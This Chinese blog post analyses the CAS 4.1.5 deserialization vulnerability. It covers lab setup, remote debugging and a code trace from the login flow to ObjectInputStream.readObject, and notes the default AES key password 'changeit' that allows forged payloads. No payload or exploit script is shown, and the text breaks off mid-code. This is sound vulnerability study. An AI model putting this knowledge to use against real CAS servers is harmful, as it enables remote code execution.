    <content type="html"><![CDATA[<h1 id="CAS-反序列化"><a href="#CAS-反序列化" class="headerlink" title="CAS 反序列化"></a>CAS 反序列化</h1><h2 id="1-部署war包"><a href="#1-部署war包" class="headerlink" title="1.部署war包"></a>1.部署war包</h2><p><a href="https://mvnrepository.com/artifact/org.jasig.cas/cas-server-webapp">下载war包</a> 4.1.5 版本，放到tomcat的webapp目录下，启动web服务。<br><font color="red">踩坑点1</font>：<br>一直提示cas-server-webapp部署失败，查看详细日志提示下面的错误。经过两天的折磨，推理分析是缺少jar包。于是各种尝试，包括下载源码从新打包部署，不同的tomcat版本等等。最后发现是*****MAC m1的homebrew安装tomcat的lib文件夹里缺少好多jar包。！！！！！重新从官网下载tomcat9.0.52，部署成功了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.core.StandardContext.listenerStart 配置应用程序监听器[com.sun.xml.ws.transport.http.servlet.WSServletContextListener]错误</span><br></pre></td></tr></table></figure><h2 id="2-远程调试"><a href="#2-远程调试" class="headerlink" title="2.远程调试"></a>2.远程调试</h2><p>理论上是可以在idea中直接可以调试的，但又出现问题了。idea打开cas-server-webapp-4.1.5文件夹，本地运行调试的时候访问localhost:8080报404错误，不想折腾了，就参照网上的<a href="https://www.cnblogs.com/nice0e3/p/14820166.html">CAS反序列化漏洞分析文章</a>,设置远程调试。</p><ol><li>修改tomcat&#x2F;bin&#x2F;catalina.sh 在最前面加上启动参数。<br><code>CATALINA_OPTS=&quot;-Xdebug -Xrunjdwp:transport=dt_socket,address=57828,suspend=n,server=y&quot;</code></li><li>idea 中添加运行环境配置 Run-&gt;Edit Configurations…，添加tomcat的Remote调试环境。注意端口和上一步中启动参数的address一致。<br><img src="/2021/09/02/210902-Java-CAS-Deserialization/ideaRemotePort.png" alt="idea远程调试配置"><br>如下图，配置成功。如果不成功，那就慢慢踩坑吧。<br><img src="/2021/09/02/210902-Java-CAS-Deserialization/ideaRemoteSuccess.png" alt="idea远程调试成功"></li></ol><h2 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="3.漏洞分析"></a>3.漏洞分析</h2><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>cas-server-app 在4.1.7之前的版本默认秘钥为“changeit”,利用这个秘钥构造恶意信息触发反序列化漏洞。</p><h3 id="解析流程"><a href="#解析流程" class="headerlink" title="解析流程"></a>解析流程</h3><p><font color="red">踩坑点2:</font> 要查看WEB-INF&#x2F;lib 文件夹下的*.jar文件的源码，需要将其加载到idea中。选中*.jar文件，右键 Add as Libray，否则无法分析源码。</p><ol><li><p>访问: <a href="http://localhost:8080/cas-server-webapp-4.1.5">http://localhost:8080/cas-server-webapp-4.1.5</a> 会自动跳转到 <a href="http://localhost:8080/cas-server-webapp-4.1.5/login">http://localhost:8080/cas-server-webapp-4.1.5/login</a> 。查看web.xml，分析得到DispathcerServlet处理&#x2F;login的请求。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--/login 对应的servlet name:cas--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>cas<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--cas 对应的的 servlet：org.springframework.web.servlet.DispatcherServlet --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>cas<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">         org.springframework.web.servlet.DispatcherServlet</span><br><span class="line">     <span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/cas-servlet.xml, /WEB-INF/cas-servlet-*.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>publishContext<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--指定Spring MVC 的配置文件---&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>cas<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">         org.springframework.web.servlet.DispatcherServlet</span><br><span class="line">     <span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/cas-servlet.xml, /WEB-INF/cas-servlet-*.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>publishContext<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>查看Spring MVC的配置文件&#x2F;WEB-INF&#x2F;cas-servlet.xml，(<a href="https://blog.csdn.net/zou8944/article/details/82391712">参考这篇文章看配置</a>)。</p><p>记录重点：</p><ul><li>Spring工作流简介：请求被DispatcherServlet拦截 -&gt; 分发flow进行处理，返回view -&gt; viewResolver解析 -&gt; 返回请求。</li></ul><p>配置项简介：</p><ul><li>FlowRegistry：必须，注册流程，指明流程配置文件所在位置；指定流程id(用于请求访问标识)；指定流程属性；此外还可以传入FlowBuilderServices进行更多个性化配置</li><li>FlowBuilderServices：必须，用于设定流程配置文件中EL表达式的解析器、form属性绑定时的转换器、view-state的view解析器等，很重要</li><li>FlowExecutor：必须，用于执行流程，可指定执行监听器(可选，常用于流程安全和持久化)</li><li>FlowHandlerAdapter：必须，用于适配Spring MVC，配置时传入FlowExecutor</li><li>FlowHandlerMapping：必须，用于将请求映射到对应的flow，配置时传入FlowRegistry</li></ul><p><strong>处理登陆逻辑的配置</strong>。如下bean，supportFlowId为“login”，执行登陆流程的Excutor为”loginFlowExecutor”，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;loginHandlerAdapter&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.jasig.cas.web.flow.SelectiveFlowHandlerAdapter&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">p:supportedFlowId</span>=<span class="string">&quot;login&quot;</span> <span class="attr">p:flowExecutor-ref</span>=<span class="string">&quot;loginFlowExecutor&quot;</span> <span class="attr">p:flowUrlHandler-ref</span>=<span class="string">&quot;loginFlowUrlHandler&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>处理登陆逻辑的类：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;loginFlowUrlHandler&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.jasig.cas.web.flow.CasDefaultFlowUrlHandler&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>“loginFlowExecutor”中登陆流程属性引用值是”loginFlowRegistry”。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">name</span>=<span class="string">&quot;loginFlowExecutor&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.webflow.executor.FlowExecutorImpl&quot;</span> </span></span><br><span class="line"><span class="tag">      <span class="attr">c:definitionLocator-ref</span>=<span class="string">&quot;loginFlowRegistry&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">c:executionFactory-ref</span>=<span class="string">&quot;loginFlowExecutionFactory&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">c:executionRepository-ref</span>=<span class="string">&quot;loginFlowExecutionRepository&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>“loginFlowRegistry”用来注册登陆流程处理逻辑。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">webflow:flow-registry</span> <span class="attr">id</span>=<span class="string">&quot;loginFlowRegistry&quot;</span> <span class="attr">flow-builder-services</span>=<span class="string">&quot;builder&quot;</span> <span class="attr">base-path</span>=<span class="string">&quot;/WEB-INF/webflow&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">webflow:flow-location-pattern</span> <span class="attr">value</span>=<span class="string">&quot;/login/*-webflow.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">webflow:flow-registry</span>&gt;</span></span><br></pre></td></tr></table></figure><p>小结，注册流程(Registry)-&gt;执行流程(Excutor)。<br><strong>查看处理登陆流程代码</strong> bean<code>loginHandlerAdapter</code>对应的的类：<code>org.jasig.cas.web.flow.SelectiveFlowHandlerAdapter</code> 。<code>SelectiveFlowHandlerAdapter</code> 继承<code>FlowHandlerAdapter</code>，<code>FlowhandlerAdapter</code> 实现接口 <code>HandlerAdapter</code>。<br>注意到：<code>SelectiveFlowHandlerAdapter</code>类在<code>cas-server-webapp-actions</code>模块下的<code>org.jasig.cas.web.flow</code>包下。因此Spring的<code>DispatcherServlet</code>找到要处理的<code>handleAdapter是SelectiveFlowHandlerAdapte</code>。并且根据地址 <a href="http://localhost:8080/cas/login?service=XXX">http://localhost:8080/cas/login?service=XXX</a> ，得到<code>handler的flowId=&quot;login&quot;</code>，即流程：<code>loginFlowRegistry</code>。如下图所示：<br><img src="/2021/09/02/210902-Java-CAS-Deserialization/loginProcessXML.png" alt="调用流程"><br><font color="blue">Tips: </font>Idea中选中类-&gt; 右键 -&gt; go to -&gt; Implementation 可以跳转到源码。<br>上面这看不懂就忽略吧，下面看一下真正的调用逻辑。<br>a) 在spring-webmvc-4.1.8.RELEASE.jar的org.springframework.web.servlet.FramewrokServlet#doPost(),方法下打断点。因为登陆的数据包是post。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="built_in">this</span>.processRequest(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/02/210902-Java-CAS-Deserialization/debugLoginPost.png" alt="doPost()方法"><br>b)继续跟进，一直到FlowHandlerAdapter#handler()方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> ModelAndView <span class="title function_">handle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span></span><br><span class="line"><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">           <span class="comment">// handler是DefaultFlowUrlHandler的实例</span></span><br><span class="line"><span class="type">FlowHandler</span> <span class="variable">flowHandler</span> <span class="operator">=</span> (FlowHandler) handler;</span><br><span class="line">checkAndPrepare(request, response, <span class="literal">false</span>);</span><br><span class="line">           <span class="comment">// 该方法获取传入的execution的值-&gt;flowExecutionKey</span></span><br><span class="line"><span class="type">String</span> <span class="variable">flowExecutionKey</span> <span class="operator">=</span> flowUrlHandler.getFlowExecutionKey(request);</span><br><span class="line"><span class="keyword">if</span> (flowExecutionKey != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">ServletExternalContext</span> <span class="variable">context</span> <span class="operator">=</span> createServletExternalContext(request, response);</span><br><span class="line">               <span class="comment">// 将flowExecutionKey的值交给flowExecutor.resumeExecution进行处理</span></span><br><span class="line"><span class="type">FlowExecutionResult</span> <span class="variable">result</span> <span class="operator">=</span> flowExecutor.resumeExecution(flowExecutionKey, context);</span><br><span class="line">handleFlowExecutionResult(result, context, request, response, flowHandler);</span><br><span class="line">&#125; <span class="keyword">catch</span> (FlowException e) &#123;</span><br><span class="line">handleFlowException(e, request, response, flowHandler);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// .........</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> c) 继续跟进flowExecutor#resumeExecution(),位于org.jasig.cas.web.flow。<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> FlowExecutionResult <span class="title function_">resumeExecution</span><span class="params">(String flowExecutionKey, ExternalContext context)</span> <span class="keyword">throws</span> FlowException &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">&quot;Resuming flow execution with key &#x27;&quot;</span> + flowExecutionKey);</span><br><span class="line">&#125;</span><br><span class="line">ExternalContextHolder.setExternalContext(context);</span><br><span class="line">               <span class="comment">// 进一步跟进 c.1)</span></span><br><span class="line"><span class="type">FlowExecutionKey</span> <span class="variable">key</span> <span class="operator">=</span> executionRepository.parseFlowExecutionKey(flowExecutionKey);</span><br><span class="line"><span class="type">FlowExecutionLock</span> <span class="variable">lock</span> <span class="operator">=</span> executionRepository.getLock(key);</span><br><span class="line">lock.lock();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">               <span class="comment">// 跟进 c.2）</span></span><br><span class="line"><span class="type">FlowExecution</span> <span class="variable">flowExecution</span> <span class="operator">=</span> executionRepository.getFlowExecution(key);</span><br><span class="line">flowExecution.resume(context);</span><br><span class="line"><span class="keyword">if</span> (!flowExecution.hasEnded()) &#123;</span><br><span class="line">executionRepository.putFlowExecution(flowExecution);</span><br><span class="line"><span class="keyword">return</span> createPausedResult(flowExecution);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">executionRepository.removeFlowExecution(flowExecution);</span><br><span class="line"><span class="keyword">return</span> createEndResult(flowExecution);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">lock.unlock();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">ExternalContextHolder.setExternalContext(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br> c.1)继续跟进executionRepository#parseFlowExecutionKey()，其调用了ClientFlowExecutionKey#parse()<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> FlowExecutionKey <span class="title function_">parseFlowExecutionKey</span><span class="params">(String encodedKey)</span> <span class="keyword">throws</span> FlowExecutionRepositoryException &#123;</span><br><span class="line">    <span class="keyword">return</span> ClientFlowExecutionKey.parse(encodedKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ClientFlowExecutionKey <span class="title function_">parse</span><span class="params">(String key)</span> <span class="keyword">throws</span> BadlyFormattedFlowExecutionKeyException &#123;</span><br><span class="line">    <span class="comment">// 按“_”分割</span></span><br><span class="line">    String[] tokens = key.split(<span class="string">&quot;_&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (tokens.length != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BadlyFormattedFlowExecutionKeyException</span>(key, <span class="string">&quot;&lt;uuid&gt;_&lt;base64-encoded-flow-state&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// _前面-&gt;uuid</span></span><br><span class="line">        UUID uuid;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            uuid = UUID.fromString(tokens[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BadlyFormattedFlowExecutionKeyException</span>(key, <span class="string">&quot;&lt;uuid&gt;_&lt;base64-encoded-flow-state&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] decoded;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// _后面的base64解码 -&gt; decode</span></span><br><span class="line">            decoded = CodecUtil.b64(tokens[<span class="number">1</span>]);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BadlyFormattedFlowExecutionKeyException</span>(key, <span class="string">&quot;&lt;uuid&gt;_&lt;base64-encoded-flow-state&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 调用ClientFlowExecutionKey构造方法，返回ClientFlowExecutionKey的对象</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ClientFlowExecutionKey</span>(uuid, decoded);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br> c.2.1) 跟进executionRepository.getFlowExecution()<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> FlowExecution <span class="title function_">getFlowExecution</span><span class="params">(FlowExecutionKey key)</span> <span class="keyword">throws</span> FlowExecutionRepositoryException &#123;</span><br><span class="line">    <span class="comment">// 判断key是不是ClientFlowExecution的对象</span></span><br><span class="line">    <span class="keyword">if</span> (!(key <span class="keyword">instanceof</span> ClientFlowExecutionKey)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Expected instance of ClientFlowExecutionKey but got &quot;</span> + key.getClass().getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 获取该对象的data数据，转为byte数组格式</span></span><br><span class="line">        <span class="comment">// 其实是execution中“_” 后面的部分。</span></span><br><span class="line">        <span class="type">byte</span>[] encoded = ((ClientFlowExecutionKey)key).getData();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 调用transcoder.decode()处理byte数组，继续跟进</span></span><br><span class="line">            ClientFlowExecutionRepository.<span class="type">SerializedFlowExecutionState</span> <span class="variable">state</span> <span class="operator">=</span> (ClientFlowExecutionRepository.SerializedFlowExecutionState)<span class="built_in">this</span>.transcoder.decode(encoded);</span><br><span class="line">            <span class="type">FlowDefinition</span> <span class="variable">flow</span> <span class="operator">=</span> <span class="built_in">this</span>.flowDefinitionLocator.getFlowDefinition(state.getFlowId());</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.flowExecutionFactory.restoreFlowExecution(state.getExecution(), flow, key, state.getConversationScope(), <span class="built_in">this</span>.flowDefinitionLocator);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClientFlowExecutionRepositoryException</span>(<span class="string">&quot;Error decoding flow execution&quot;</span>, var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br> c2.2) 跟进this.transcoder.decode(encoded)，一共两个步骤，解密数组和反序列化对象。继续跟进<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> Object <span class="title function_">decode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] encoded)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] data;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 首先，解密数组</span></span><br><span class="line">        data = cipherBean.decrypt(encoded);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Decryption error&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ByteArrayInputStream</span> <span class="variable">inBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.compression) &#123;</span><br><span class="line">            in = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(inBuffer));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            in = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inBuffer);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 其次，反序列化解密后的数组</span></span><br><span class="line">        <span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Deserialization error&quot;</span>, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (in != <span class="literal">null</span>) &#123;</span><br><span class="line">            in.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br> c2.3)查看一下加密的算法，当前类的构造函数。<br> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">EncryptedTranscoder</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">BufferedBlockCipherBean</span> <span class="variable">bufferedBlockCipherBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedBlockCipherBean</span>();</span><br><span class="line">    <span class="comment">// 加密方式 AES/CBC/PKCS7</span></span><br><span class="line">    bufferedBlockCipherBean.setBlockCipherSpec(<span class="keyword">new</span> <span class="title class_">BufferedBlockCipherSpec</span>(<span class="string">&quot;AES&quot;</span>, <span class="string">&quot;CBC&quot;</span>, <span class="string">&quot;PKCS7&quot;</span>));</span><br><span class="line">    <span class="comment">// 跟进查看存储位置,keystore:&quot;/etc/keystore.jceks&quot;</span></span><br><span class="line">    bufferedBlockCipherBean.setKeyStore(createAndPrepareKeyStore());</span><br><span class="line">    bufferedBlockCipherBean.setKeyAlias(<span class="string">&quot;aes128&quot;</span>);</span><br><span class="line">    bufferedBlockCipherBean.setKeyPassword(<span class="string">&quot;changeit&quot;</span>);</span><br><span class="line">    bufferedBlockCipherBean.setNonce(<span class="keyword">new</span> <span class="title class_">RBGNonce</span>());</span><br><span class="line"></span><br><span class="line">    setCipherBean(bufferedBlockCipherBean);</span><br><span 